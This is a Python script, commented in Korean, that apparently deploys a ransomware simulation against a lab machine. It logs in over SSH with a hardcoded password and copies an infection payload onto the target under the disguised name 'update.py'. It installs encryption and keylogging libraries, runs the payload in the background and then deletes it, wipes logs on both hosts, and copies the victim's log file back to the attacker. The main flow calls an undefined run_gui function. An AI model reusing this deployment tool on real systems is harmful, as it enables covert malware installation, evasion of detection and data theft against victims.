#!/usr/bin/env python3
import os
import subprocess
import time
import re
import sys
 
# ───── 기본 설정 ─────
TARGET_IP = "192.168.56.102"
USER = "ubuntu-victim2"
PASSWORD = "nct127"
REMOTE_DIR = "/home/ubuntu-victim2/gui_test1"
 
LOCAL_FILES = [
    "gui_test1.py",
    "infect.py",
    "img/app_icon.ico",
    "img/app_icon.xbm",
    "img/logo.png",
    "img/thank-you.png"
]
 
LOG_REMOTE_PATH = "/tmp/logs.txt"
LOG_ATTACKER_PATH = "/home/ubuntu-victim1/ransomware_sim/logs.txt"
 
# 희생자 PC에 저장할 infect.py 은폐용 파일명
REMOTE_INFECT_NAME = "update.py"
 
# ───── SSH 실행 함수 ─────
def run_ssh(command, use_sudo=False):
    if use_sudo:
        command = f"echo '{PASSWORD}' | sudo -S -- sh -c '{command}'"
    ssh_cmd = f"sshpass -p '{PASSWORD}' ssh -o StrictHostKeyChecking=no {USER}@{TARGET_IP} \"{command}\""
    result = subprocess.run(ssh_cmd, shell=True)
    if result.returncode != 0:
        print(f"[!] SSH 명령 실패: {command}")
    return result
 
# ───── SCP 함수 ─────
def run_scp(local_path, remote_path, reverse=False):
    cmd = [
        "sshpass", "-p", PASSWORD,
        "scp", "-o", "StrictHostKeyChecking=no"
    ]
    if reverse:
        cmd.extend([f"{USER}@{TARGET_IP}:{remote_path}", local_path])
    else:
        cmd.extend([local_path, f"{USER}@{TARGET_IP}:{remote_path}"])
    result = subprocess.run(cmd)
    if result.returncode != 0:
        print(f"[!] SCP 명령 실패: {local_path} -> {remote_path}")
    return result
 
# ───── 0) 공격자 PC 로그 파일 삭제 ─────
def clear_attacker_logs():
    if os.path.exists(LOG_ATTACKER_PATH):
        print("[+] 공격자 PC 로그 파일 삭제 중...")
        os.remove(LOG_ATTACKER_PATH)
 
# ───── 0) 희생자 PC 로그 파일 삭제 ─────
def clear_victim_logs():
    print("[+] 희생자 PC 로그 파일 삭제 중...")
    run_ssh(f"rm -f {LOG_REMOTE_PATH}")
 
# ───── 1) 파일 전송 ─────
def transfer_files():
    print("[+] 타겟 디렉토리 생성 중...")
    run_ssh(f"mkdir -p {REMOTE_DIR}/img")
    print("[+] 파일 전송 중...")
    for file in LOCAL_FILES:
        if not os.path.exists(file):
            print(f"[!] 파일 누락: {file} (전송 생략)")
            continue
        # infect.py 파일은 update.py 이름으로 저장
        if file == "infect.py":
            run_scp(file, f"{REMOTE_DIR}/{REMOTE_INFECT_NAME}")
        else:
            run_scp(file, f"{REMOTE_DIR}/{file}")
 
# ───── 2) 종속성 설치 ─────
def install_dependencies():
    print("[+] 종속성 설치 중...")
    install_cmd = (
        "apt update -y && "
        "apt install -y python3-pip python3-tk python3-pil.imagetk && "
        "python3 -m pip install pycryptodome pynput"
    )
    run_ssh(install_cmd, use_sudo=True)
 
# ───── 3) infect.py (update.py) 실행 및 즉시 삭제 ─────
def run_infect_script():
    print("[+] update.py 실행 및 즉시 삭제 중...")
    # update.py 실행 & 백그라운드, 그리고 삭제
    cmd = (
        f"nohup python3 {REMOTE_DIR}/{REMOTE_INFECT_NAME} > /tmp/infect_log.txt 2>&1 & "
        f"sleep 2 && rm -f {REMOTE_DIR}/{REMOTE_INFECT_NAME}"
    )
    run_ssh(cmd)
 
# ───── 5) 로그 역전송 ─────
def retrieve_logs(retry_seconds=120, interval=2, max_retries=5):
    print("[+] logs.txt 생성 대기 중...")
    log_size = -1
    retries = 0
    while retries < max_retries:
        result = subprocess.run(
            f"sshpass -p '{PASSWORD}' ssh -o StrictHostKeyChecking=no {USER}@{TARGET_IP} stat -c%s {LOG_REMOTE_PATH}",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            new_size = int(result.stdout.strip())
            if new_size > log_size:
                print(f"[✓] logs.txt 사이즈 변경됨: {log_size} -> {new_size} bytes, 복사 시도")
                log_size = new_size
                scp_result = subprocess.run([
                    "sshpass", "-p", PASSWORD,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    f"{USER}@{TARGET_IP}:{LOG_REMOTE_PATH}",
                    LOG_ATTACKER_PATH
                ])
                if scp_result.returncode == 0:
                    print("[✓] 로그 파일 복사 성공")
                else:
                    print("[!] 로그 파일 복사 실패")
                retries += 1
                time.sleep(interval)
            else:
                print("[*] 로그 변화 없음, 대기 중...")
                retries += 1
                time.sleep(interval)
        else:
            print("[!] logs.txt 접근 실패")
            time.sleep(interval)

# ───── 메인 흐름 ─────
if __name__ == "__main__":
    clear_attacker_logs()  # 0) 공격자 PC 로그 삭제
    transfer_files()       # 1) 파일 전송
    clear_victim_logs()    # 0) 희생자 PC 로그 삭제
    install_dependencies() # 2) 종속성 설치
    run_infect_script()    # 3) update.py 실행
    time.sleep(1.5)
    run_gui()              # 4) GUI 실행
    retrieve_logs()        # 5) 로그 역전송
    print("[✓] 공격 시뮬레이션 완료.")
